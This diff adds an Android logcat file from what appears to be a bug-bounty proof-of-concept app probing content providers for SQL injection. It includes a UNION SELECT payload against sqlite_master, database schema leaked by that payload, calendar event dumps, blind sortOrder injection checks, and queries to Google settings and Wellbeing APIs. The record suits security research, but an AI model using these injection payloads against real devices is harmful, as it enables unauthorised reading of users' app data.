@@ -1,0 +1,102 @@
+--------- beginning of main
+09-07 02:05:30.653 15433 15433 D ExpandedSQLi: === Calendar WRITE SQLi Tests ===
+09-07 02:05:30.660 15433 15433 D ExpandedSQLi: INSERT SQLi query returned 0 rows
+09-07 02:05:30.663 15433 15433 D ExpandedSQLi: UPDATE SQLi: 0 rows
+09-07 02:05:30.666 15433 15433 D ExpandedSQLi: DELETE SQLi: 0 rows
+09-07 02:05:30.670 15433 15433 D ExpandedSQLi: Check for injected event: 0 found
+09-07 02:05:30.670 15433 15433 D ExpandedSQLi: 
+09-07 02:05:30.670 15433 15433 D ExpandedSQLi: === Calendar Event Data Extraction ===
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: Events extracted: 20
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Ambedkar Jayanti||en-gb.indian#holiday@group.v.calendar.google.com|Observance
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: To hide observances, go to Google Calendar Settings > Holidays in India
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Ambedkar Jayanti||en-gb.indian#holiday@group.v.calendar.google.com|Public holiday
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Ambedkar Jayanti||en.indian#holiday@group.v.calendar.google.com|Observance
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: To hide observances, go to Google Calendar Settings > Holidays in India
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Ambedkar Jayanti||en.indian#holiday@group.v.calendar.google.com|Public holiday
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Bahag Bihu||en-gb.indian#holiday@group.v.calendar.google.com|Observance
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: To hide observances, go to Google Calendar Settings > Holidays in India
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Bahag Bihu||en.indian#holiday@group.v.calendar.google.com|Observance
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: To hide observances, go to Google Calendar Settings > Holidays in India
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Bakrid (tentative)||en-gb.indian#holiday@group.v.calendar.google.com|Public holiday
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: Date is tentative and may change.
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Bakrid (tentative)||en.indian#holiday@group.v.calendar.google.com|Public holiday
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: Date is tentative and may change.
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Bakrid||en-gb.indian#holiday@group.v.calendar.google.com|Public holiday
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Bakrid||en.indian#holiday@group.v.calendar.google.com|Public holiday
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Bhai Duj||en-gb.indian#holiday@group.v.calendar.google.com|Observance
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: To hide observances, go to Google Calendar Settings > Holidays in India
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Bhai Duj||en.indian#holiday@group.v.calendar.google.com|Observance
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: To hide observances, go to Google Calendar Settings > Holidays in India
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Birthday of Rabindranath||en-gb.indian#holiday@group.v.calendar.google.com|Observance
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: To hide observances, go to Google Calendar Settings > Holidays in India
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Birthday of Rabindranath||en.indian#holiday@group.v.calendar.google.com|Observance
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: To hide observances, go to Google Calendar Settings > Holidays in India
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Buddha Purnima||en-gb.indian#holiday@group.v.calendar.google.com|Public holiday
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Buddha Purnima||en.indian#holiday@group.v.calendar.google.com|Public holiday
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Chhat Puja (Pratihar Sashthi/Surya Sashthi)||en-gb.indian#holiday@group.v.calendar.google.com|Observance
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: To hide observances, go to Google Calendar Settings > Holidays in India
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Chhat Puja (Pratihar Sashthi/Surya Sashthi)||en.indian#holiday@group.v.calendar.google.com|Observance
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: To hide observances, go to Google Calendar Settings > Holidays in India
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Christmas Eve||en-gb.indian#holiday@group.v.calendar.google.com|Observance
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: To hide observances, go to Google Calendar Settings > Holidays in India
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi:   EVENT: Christmas Eve||en.indian#holiday@group.v.calendar.google.com|Observance
+09-07 02:05:30.672 15433 15433 D ExpandedSQLi: To hide observances, go to Google Calendar Settings > Holidays in India
+09-07 02:05:30.673 15433 15433 D ExpandedSQLi: 
+09-07 02:05:30.673 15433 15433 D ExpandedSQLi: === Calendar Attendee Extraction ===
+09-07 02:05:30.674 15433 15433 D ExpandedSQLi: Attendees extracted: 0
+09-07 02:05:30.674 15433 15433 D ExpandedSQLi: 
+09-07 02:05:30.674 15433 15433 D ExpandedSQLi: === Calendar sortOrder Injection ===
+09-07 02:05:30.675 15433 15433 D ExpandedSQLi: sortOrder stacked: 4 rows
+09-07 02:05:30.676 15433 15433 D ExpandedSQLi: sortOrder CASE (sync check): 4 rows - blind SQLi confirmed if no error
+09-07 02:05:30.676 15433 15433 D ExpandedSQLi: 
+09-07 02:05:30.676 15433 15433 D ExpandedSQLi: === Calendar Projection Injection ===
+09-07 02:05:30.677 15433 15433 D ExpandedSQLi: Projection inject error: Invalid column * FROM Calendars UNION SELECT sql,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM sqlite_master--
+09-07 02:05:30.678 15433 15433 D ExpandedSQLi: Subquery projection: 4 rows
+09-07 02:05:30.678 15433 15433 D ExpandedSQLi:   LEAK: CREATE TABLE android_metadata (locale TEXT)|||CREATE TABLE _sync_state (_id INTEGER PRIMARY KEY,account_name TEXT NOT NULL,account_type TEXT NOT NULL,data TEXT,UNIQUE(account_name, account_type))|||CR
+09-07 02:05:30.678 15433 15433 D ExpandedSQLi:   LEAK: CREATE TABLE android_metadata (locale TEXT)|||CREATE TABLE _sync_state (_id INTEGER PRIMARY KEY,account_name TEXT NOT NULL,account_type TEXT NOT NULL,data TEXT,UNIQUE(account_name, account_type))|||CR
+09-07 02:05:30.678 15433 15433 D ExpandedSQLi:   LEAK: CREATE TABLE android_metadata (locale TEXT)|||CREATE TABLE _sync_state (_id INTEGER PRIMARY KEY,account_name TEXT NOT NULL,account_type TEXT NOT NULL,data TEXT,UNIQUE(account_name, account_type))|||CR
+09-07 02:05:30.678 15433 15433 D ExpandedSQLi:   LEAK: CREATE TABLE android_metadata (locale TEXT)|||CREATE TABLE _sync_state (_id INTEGER PRIMARY KEY,account_name TEXT NOT NULL,account_type TEXT NOT NULL,data TEXT,UNIQUE(account_name, account_type))|||CR
+09-07 02:05:30.678 15433 15433 D ExpandedSQLi: 
+09-07 02:05:30.678 15433 15433 D ExpandedSQLi: === GMS Provider Tests ===
+09-07 02:05:30.679 15433 15433 D ExpandedSQLi: com.google.android.gsf.gservices: SecurityException - Permission Denial: opening provider com.google.android.gms.gservices.provider.GservicesProvider from ProcessRecord{3b5e00f 15433:com.vrp.poc/u0a361} (pid=15433, uid=10361) requires com.google.android.providers.gsf.permission.READ_GSERVICES or com.google.android.providers.gsf.permission.WRITE_GSERVICES
+09-07 02:05:30.681 15433 15433 D ExpandedSQLi: com.google.settings: IllegalArgumentException - Invalid URI: content://com.google.settings
+09-07 02:05:30.683 15433 15433 D ExpandedSQLi: com.google.android.gms.phenotype: null cursor
+09-07 02:05:30.683 15433 15433 D ExpandedSQLi: com.google.android.gms.icing.proxy.InternalIcingCorporaProvider: null cursor
+09-07 02:05:30.683 15433 15433 D ExpandedSQLi: Phenotype call: null result
+09-07 02:05:30.684 15433 15433 D ExpandedSQLi: GServices error: Permission Denial: opening provider com.google.android.gms.gservices.provider.GservicesProvider from ProcessRecord{3b5e00f 15433:com.vrp.poc/u0a361} (pid=15433, uid=10361) requires com.google.android.providers.gsf.permission.READ_GSERVICES or com.google.android.providers.gsf.permission.WRITE_GSERVICES
+09-07 02:05:30.686 15433 15433 D ExpandedSQLi: Google Settings/partner: 23 rows, 3 cols
+09-07 02:05:30.686 15433 15433 D ExpandedSQLi:   Cols: name,_id,value
+09-07 02:05:30.686 15433 15433 D ExpandedSQLi:   data_store_version = 4
+09-07 02:05:30.686 15433 15433 D ExpandedSQLi:   network_location_opt_in = 48
+09-07 02:05:30.686 15433 15433 D ExpandedSQLi:   user_full_data_backup_aware = 49
+09-07 02:05:30.686 15433 15433 D ExpandedSQLi:   backup_enabled:com.android.providers.telephony = 50
+09-07 02:05:30.686 15433 15433 D ExpandedSQLi:   backup_enabled:com.android.calllogbackup = 51
+09-07 02:05:30.686 15433 15433 D ExpandedSQLi:   backup_encryption_opt_in_displayed = 52
+09-07 02:05:30.686 15433 15433 D ExpandedSQLi:   mms_backup_enabled = 53
+09-07 02:05:30.686 15433 15433 D ExpandedSQLi:   client_id = 210
+09-07 02:05:30.686 15433 15433 D ExpandedSQLi:   search_client_id = 211
+09-07 02:05:30.686 15433 15433 D ExpandedSQLi:   search_a2_client_id = 212
+09-07 02:05:30.686 15433 15433 D ExpandedSQLi: 
+09-07 02:05:30.687 15433 15433 D ExpandedSQLi: === Wellbeing API Tests ===
+09-07 02:05:30.691 15433 15433 D ExpandedSQLi: Wellbeing get_bedtime_mode_state: GOT RESULT
+09-07 02:05:30.691 15433 15433 D ExpandedSQLi:   success = false
+09-07 02:05:30.691 15433 15433 D ExpandedSQLi:   tts_config = bytes[33]
+09-07 02:05:30.694 15433 15433 D ExpandedSQLi: Wellbeing get_focus_mode_state: GOT RESULT
+09-07 02:05:30.694 15433 15433 D ExpandedSQLi:   success = false
+09-07 02:05:30.694 15433 15433 D ExpandedSQLi:   tts_config = bytes[33]
+09-07 02:05:30.699 15433 15433 D ExpandedSQLi: Wellbeing get_wind_down_state: SecurityException - Access not allowed for non-Google app: com.vrp.poc
+09-07 02:05:30.701 15433 15433 D ExpandedSQLi: Wellbeing get_screen_time_summary: GOT RESULT
+09-07 02:05:30.701 15433 15433 D ExpandedSQLi:   success = false
+09-07 02:05:30.701 15433 15433 D ExpandedSQLi:   tts_config = bytes[33]
+09-07 02:05:30.704 15433 15433 D ExpandedSQLi: Wellbeing get_usage_stats: GOT RESULT
+09-07 02:05:30.704 15433 15433 D ExpandedSQLi:   success = false
+09-07 02:05:30.704 15433 15433 D ExpandedSQLi:   tts_config = bytes[33]
+09-07 02:05:30.706 15433 15433 D ExpandedSQLi: Wellbeing get_app_timers: GOT RESULT
+09-07 02:05:30.706 15433 15433 D ExpandedSQLi:   success = false
+09-07 02:05:30.706 15433 15433 D ExpandedSQLi:   tts_config = bytes[33]
+09-07 02:05:30.708 15433 15433 D ExpandedSQLi: Wellbeing get_parental_controls_state: GOT RESULT
+09-07 02:05:30.708 15433 15433 D ExpandedSQLi:   success = false
+09-07 02:05:30.708 15433 15433 D ExpandedSQLi:   tts_config = bytes[33]
+09-07 02:05:30.708 15433 15433 D ExpandedSQLi: 
+09-07 02:05:30.708 15433 15433 D ExpandedSQLi: === Emergency Config Provider ===
+09-07 02:05:30.709 15433 15433 D ExpandedSQLi: 
